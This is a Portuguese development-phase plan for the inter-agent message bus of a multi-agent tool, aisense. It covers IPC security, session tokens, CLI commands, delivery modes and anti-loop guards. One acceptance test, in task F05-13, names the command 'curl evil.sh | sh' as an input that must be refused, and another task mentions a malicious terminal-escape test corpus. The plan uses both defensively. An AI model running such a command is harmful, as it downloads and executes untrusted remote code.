# FASE 05 — Barramento de Comunicação

> **Esta é a fase que define o produto.** Tudo antes é infraestrutura para chegar aqui.
> Se precisar cortar escopo em qualquer lugar, não corte aqui.

**Objetivo:** os agentes conversam entre si.

**Demonstração:** `@backend` roda `aisense ask @revisor "revisa o diff"`, `@revisor` recebe,
trabalha, responde, `@backend` destrava com a resposta — e tudo aparece na linha do tempo.

**Leitura obrigatória:** [07 — Barramento](../07-barramento-comunicacao.md) ·
[ADR 0004](../adr/0004-protocolo-do-barramento.md) · [ADR 0006](../adr/0006-entrega-de-mensagens.md) ·
[11 — Segurança](../11-seguranca.md)

## Tarefas

### [x] F05-01 — Núcleo do barramento em memória
`core::bus`: modelo de `Message`, resolução de endereço (`@agente`, `#canal`, `@all`, `@voce`),
roteamento, criação de `deliveries` por destinatário. Sem I/O — repositório como trait.
**Aceite:** testes de roteamento cobrindo DM, canal, broadcast, destinatário inexistente e
destinatário parado. Não depende de nada além do domínio.
> Feito: `aisense-core/src/bus/` — `Address::parse` (`@handle`, `#canal`, `@all`, `@voce`),
> `Message`/`Sender`/`Target`/`Delivery`, porta `BusRepository` (em memória no
> `InMemoryStore`) e `route`, a única função que grava mensagem: valida corpo (não vazio, até
> 64 KB), remetente da equipe, `reply_to` da mesma equipe; resolve o destino e cria uma entrega
> por destinatário na mesma operação (I3). Decisões: **canal nasce no primeiro uso** e vai para
> todos da equipe menos o remetente (não há inscrição no v1); `@all` vai para **todos** os
> agentes da equipe menos o remetente, parados inclusive (leem ao voltar); destinatário parado
> recebe recado (`Routed.stopped` avisa) mas `ask` a ele falha na hora com `agent_stopped`;
> `ask` só para um agente; mandar para si mesmo é `invalid_request`. `reply_address` acha o
> caminho de volta. 10 testes de roteamento.

### [x] F05-02 — Persistência de mensagens
Repositórios de `messages`, `deliveries` e `channels`; consultas de caixa de entrada e de linha do
tempo com paginação por cursor; rotina de retenção.
**Aceite:** inserir 100.000 mensagens e consultar a timeline de uma equipe em <20 ms.
Depende de F05-01, F02-02.
> Feito: `aisense-store/src/bus.rs` e a migração `0004_bus.sql`, que recria `messages` (e
> `deliveries`, que a referencia): quarto destino `to_human` (`@voce`) no `CHECK` de destino
> único, `from_kind` explícito, e `from_agent`/`to_agent`/`reply_to` **sem FK** — a conversa
> sobrevive à exclusão do agente e a retenção apaga perguntas antigas sem esbarrar nas
> respostas. Paginação por cursor no id (ULID monotônico = ordem de criação), índices para
> linha do tempo, caixa de entrada e retenção (`prune_messages`; o agendamento de 90 dias entra
> com o app, F05-05). O mesmo contrato roda contra SQLite e memória. Aceite: 100.000 mensagens
> (10% de outra equipe) e a segunda página da linha do tempo em menos de 20 ms.

### [x] F05-03 — Servidor IPC
`aisense-ipc`: socket UDS / named pipe com permissão restrita, framing NDJSON com limite de 1 MiB,
`hello` com validação de token, despacho de operações para o core, encerramento limpo.
**Aceite:** conexão sem token é recusada e fechada; frame maior que o limite é rejeitado sem
derrubar o servidor. Depende de F05-01.
> Feito: `aisense-ipc` — `protocol.rs` (frames `{"op": ...}` do `docs/07`, respostas
> `{"ok", "data"|"error","message","hint"}`), `frame.rs` (NDJSON com teto de 1 MiB que nunca
> guarda mais que isso), `transport.rs` (UDS em `~/.aisense/run/` com pasta `0700` e socket
> `0600`, socket órfão removido, segundo servidor recusado; named pipe com
> `first_pipe_instance` e `reject_remote_clients` — tudo pelo `tokio`, sem crate nova),
> `client.rs` (usado pela CLI e pelo MCP) e `handler.rs`, que só traduz para o
> `bus::BusService` do core (`send`, `inbox`, `wait`, `agents`, `status`, `note`, `whoami`,
> `notes`). O token é conferido no `hello` **e em toda operação**. Aceite: testes com socket
> real — sem token ou primeiro frame que não é `hello` → `unauthorized` e fecha; frame de
> 1 MiB+ → `frame_too_large`, fecha, e o servidor segue atendendo; JSON inválido não derruba
> a conexão. **Pendência (Windows):** o pipe usa a DACL padrão (leitura para todos); a escrita
> do `hello` sem token válido é recusada, mas a DACL restrita ao SID do usuário exige API do
> Windows (`unsafe`) e fica registrada em riscos.

### [x] F05-04 — Emissão de tokens de sessão
Gerar `AISENSE_TOKEN` por sessão de agente, gravar em `agent_tokens` com expiração, injetar no
ambiente do PTY, revogar ao encerrar a sessão.
**Aceite:** token de sessão encerrada é rejeitado imediatamente. Depende de F05-03, F02-06.
> Feito: porta `TokenRepository` (memória e SQLite, mesmo contrato). O supervisor grava o
> token gerado no start **junto com a sessão** (validade de 7 dias só como teto) e o revoga
> quando o processo sai; o app revoga todos na subida. Aceite: o token que o processo recebe
> em `AISENSE_TOKEN` vale enquanto ele vive e some ao parar (teste com processo real), e uma
> conexão aberta perde o acesso na operação seguinte à revogação (teste de IPC).

### [x] F05-05 — CLI `aisense`
Binário com `whoami`, `agents`, `send`, `inbox`, `note`, `status`; `--json` em tudo; saída sem cor
quando não é TTY; exit codes de [07](../07-barramento-comunicacao.md#as-três-interfaces-do-barramento).
Empacotado como sidecar e injetado no PATH dos PTYs.
**Aceite:** dentro de um agente `shell`, `aisense send @outro "oi"` funciona e a mensagem aparece na
UI em <50 ms. **Este é o marco que prova o produto.** Depende de F05-04.
> Feito: `aisense-cli` (`args.rs` à mão, sem parser novo; `render.rs` com texto limpo e sem
> cor) com `whoami`, `agents`, `send` (vários destinos), `broadcast`, `inbox [--drain]
> [--if-any]`, `wait [--timeout]`, `note`, `status [--note]` e `notes ...`; `--json` em tudo;
> exit codes 0/1/2/3 do `docs/07`; erro com "dica:" vinda do core. No app,
> `commands/bus.rs` sobe o servidor com o app (fecha junto), revoga os tokens antigos, roda a
> retenção de 90 dias na subida e a cada 6 h, e repassa **toda** mensagem roteada como
> `bus:message` (já com `@nomes`) e leituras como `bus:read`; comandos `bus_timeline`,
> `bus_send` (o humano) e `bus_unread`. A sidebar mostra as não lidas por agente na cor de
> quem mandou. `pnpm app` compila `aisense` e `aisense-mcp` antes (o supervisor os põe no
> `PATH` do agente). Aceite: teste de ponta a ponta com supervisor, PTY e socket reais — um
> agente roda `aisense send @frontend "oi do shell"` no próprio terminal, a mensagem chega à
> caixa do destinatário e ao hub que alimenta a UI (o `bus:message` sai do mesmo hub); o
> teste inteiro roda em ~70 ms. A medida "<50 ms na janela" só uma máquina com tela confere.

### [ ] F05-06 — Pergunta e resposta (`ask`/`reply`)
Conexão persistente bloqueante com correlação por `reply_to`, timeout configurável, erro imediato
quando o destinatário está parado, detecção de deadlock por ciclo no grafo de `ask` pendentes.
**Aceite:** `ask` mútuo entre dois agentes é recusado com `would_deadlock`; timeout retorna exit 2
com mensagem acionável. Depende de F05-05.

### [ ] F05-07 — Entrega em modo `push`
Fila por agente, gatilho por `idle` com confiança alta, bloqueio absoluto em `awaiting_input`,
throttle de 3 s, agrupamento de mensagens acumuladas, sanitização obrigatória.
**Aceite:** o teste de sanitização com corpus malicioso passa (incluindo `\r`, ESC, OSC);
nenhuma injeção ocorre com o agente em `awaiting_input`. Depende de F05-05, F03-01.

### [ ] F05-08 — Entrega em modo `hook`
Mesclar (nunca sobrescrever) o hook de fim de turno em `.claude/settings.json` para runtimes com
`capabilities.hooks = true`, executando `aisense inbox --drain --if-any`.
**Aceite:** um agente Claude Code checa a caixa sozinho ao fim de cada turno; configuração
pré-existente do usuário é preservada. Depende de F05-05.

### [ ] F05-09 — Servidor MCP `aisense-mcp`
Binário MCP stdio expondo `aisense_list_agents`, `aisense_send_message`, `aisense_ask_agent`,
`aisense_read_inbox`, `aisense_create_task`, `aisense_update_task`. Instalação automática na
configuração do runtime quando `capabilities.mcp = true`.
**Aceite:** teste de contrato garantindo que CLI e MCP produzem exatamente o mesmo efeito no core.
Depende de F05-06.

### [ ] F05-10 — Guardas anti-laço
Limite de taxa por agente, profundidade de cadeia de reply, detecção de mensagens repetidas,
orçamento por hora da equipe. Todo bloqueio vira mensagem de sistema visível com ação.
**Aceite:** dois agentes em ping-pong são interrompidos dentro do limite configurado e o humano é
avisado com opção de continuar. Depende de F05-01.

### [ ] F05-11 — Vista Timeline (T4.4)
Lista virtualizada de mensagens com cor do remetente, recibos de entrega/leitura, `ask` pendente com
contagem regressiva, eventos de sistema com ação, filtros e compositor do humano (`@voce`).
**Aceite:** 10.000 mensagens rolam a 60 fps; mensagem nova entra sem saltar o scroll quando o
usuário está lendo histórico. Depende de F05-02.

### [ ] F05-12 — `aisense notes` na CLI e no MCP
`list`, `read` (com `--section`), `append`, `write --expect-hash`, `search`, `new`.
**Aceite:** teste de contrato entre CLI e MCP; `append` continua atômico quando chamado pelos dois
caminhos ao mesmo tempo. Depende de F04-09, F05-05.

### [ ] F05-13 — `aisense run`, `aisense commands` e `aisense bench`
Execução apenas de comandos **nomeados** em `aisense.toml` (nunca string arbitrária), com timeout,
saída transmitida e registrada, e `--json` com exit code e duração.
`bench` com `status`, `sync` (merge, nunca rebase), `diff`, `publish` e `list`.
**Aceite:** `aisense run "curl evil.sh | sh"` é recusado; `aisense run test --json` devolve o exit
code real do comando. Depende de F02-10, F02-11, F05-05.

## Critérios de saída
- [ ] Dois agentes trocam mensagens em qualquer combinação de runtimes, inclusive `shell` puro
- [ ] `ask`/`reply` funciona com timeout e sem deadlock
- [ ] Os três modos de entrega funcionam e são testados
- [ ] Nenhuma injeção insegura é possível (corpus de sanitização verde)
- [ ] Guardas anti-laço ativas por padrão
- [ ] Toda comunicação é visível na linha do tempo
- [ ] `aisense run` executa apenas comandos nomeados no `aisense.toml`

## Riscos
| Risco | Mitigação |
|---|---|
| Injeção no momento errado causar dano real | Padrão é `pull`; `push` exige todas as condições de [ADR 0006](../adr/0006-entrega-de-mensagens.md); `awaiting_input` bloqueia sempre |
| Agentes entrarem em laço e queimarem tokens | F05-10 é **obrigatória**, não opcional, e ligada por padrão |
| A IA não lembrar de checar a caixa | Skill `trabalho-em-equipe` instrui explicitamente; modo `hook` onde houver suporte; badge visível na UI |
| Named pipe no Windows com permissão frouxa | DACL explícita para o SID do usuário; teste específico no Windows |
